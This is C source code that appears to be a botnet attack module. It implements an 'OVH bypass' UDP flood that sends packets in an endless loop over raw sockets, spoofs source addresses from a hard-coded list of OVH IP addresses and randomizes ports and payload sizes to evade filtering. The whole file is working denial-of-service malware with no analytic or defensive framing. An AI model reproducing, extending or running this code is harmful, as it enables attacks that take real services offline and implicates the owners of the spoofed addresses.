#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <fcntl.h>
#include <errno.h>

#include "includes.h"
#include "attack.h"
#include "protocol.h"
#include "util.h"
#include "checksum.h"
#include "rand.h"

#define OVH_PHI 0xaaf219b9

static unsigned long int Q[4096], c = 362436;

void ovh_rand_init(unsigned long int x)
{
    int i;
    Q[0] = x;
    Q[1] = x + OVH_PHI;
    Q[2] = x + OVH_PHI + OVH_PHI;
    for (i = 3; i < 4096; i++)
    {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ OVH_PHI ^ i;
    }
}

unsigned long int ovh_rand(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c)
    {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}

void attack_ovh(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char datagram[4096];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(iph + 1);
    
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xffff);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 128);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    int data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    int pps_limiter = attack_get_opt_int(opts_len, opts, ATK_OPT_PPS, 0);
    uint32_t source_ip = attack_get_opt_int(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);

    // Large pool of OVH source IPs for spoofing
    uint32_t ovh_ips[] = {
        2372231209, 2728286747, 1572769288, 3339925505, 2372233279, 3254787125,
        1160024353, 2328478311, 3266388596, 3238005002, 1745910789, 3455829265,
        1822614803, 3355015169, 3389792053, 757144879, 2734605396, 1230980369,
        3639549962, 2728310654, 3256452616, 3561573700, 2918529833, 2890221130,
        2918997764, 2453837834, 3369835018, 3256452681, 3007103780, 1137178634,
        3264375402, 3229415686, 2728310653, 3627732067, 2890220626, 1137178635,
        3391077889, 1745910533, 1755074592, 16843009, 1092011777, 3223532318,
        2918529914, 621985916, 2728287341, 1191626519, 2890184316, 1822618132
    };
    int num_ovh_ips = sizeof(ovh_ips) / sizeof(ovh_ips[0]);

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
    {
#ifdef DEBUG
        printf("Failed to create raw socket. Aborting attack\n");
#endif
        return;
    }

    i = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
#ifdef DEBUG
        printf("Failed to set IP_HDRINCL. Aborting\n");
#endif
        close(fd);
        return;
    }

    ovh_rand_init(time(NULL));
    memset(datagram, 0, sizeof(datagram));

    // Setup IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = ip_tos;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + 4);
    iph->id = htonl(54321);
    iph->frag_off = 0;
    iph->ttl = ip_ttl;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    iph->saddr = source_ip;

    // Setup UDP header with OVH bypass payload
    udph->source = htons(sport);
    udph->dest = htons(dport);
    udph->check = 0;
    util_memcpy((void *)udph + sizeof(struct udphdr), "\x08\x1e\x77\xda", 4);

    // Pre-generate random payload
    char payload[4096];
    for (i = 0; i < 4096; i++)
    {
        payload[i] = ovh_rand() & 0xff;
    }

    int sent = 0;
    int sleeptime = 100;

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct sockaddr_in sin;
            int packet_len;

            sin.sin_family = AF_INET;
            sin.sin_addr.s_addr = targs[i].addr;
            sin.sin_port = htons(dport);

            // Randomize source IP from OVH pool
            iph->saddr = htonl(ovh_ips[ovh_rand() % num_ovh_ips]);

            // Randomize source port
            if (sport == 0xffff)
                udph->source = htons((ovh_rand() & 0xffff) % 65535);
            else
                udph->source = htons(sport);

            // Randomize payload size
            packet_len = data_len;
            if (ovh_rand() % 2 == 0)
                packet_len = data_len / 2;

            if (packet_len < 100) packet_len = 100;
            if (packet_len > 1400) packet_len = 1400;

            // Set random payload
            util_memcpy((void *)udph + sizeof(struct udphdr), payload, packet_len);
            udph->len = htons(sizeof(struct udphdr) + packet_len);

            // Update IP header
            iph->id = htonl(ovh_rand() & 0xffffffff);
            iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + packet_len);
            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp(iph, udph, udph->len, sizeof(struct udphdr) + packet_len);

            sendto(fd, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));

            sent++;
            // Apply PPS limiter if set (> 0 means limited)
            if (pps_limiter > 0 && sent >= pps_limiter)
            {
                sent = 0;
                usleep(sleeptime);
            }
        }
    }
}
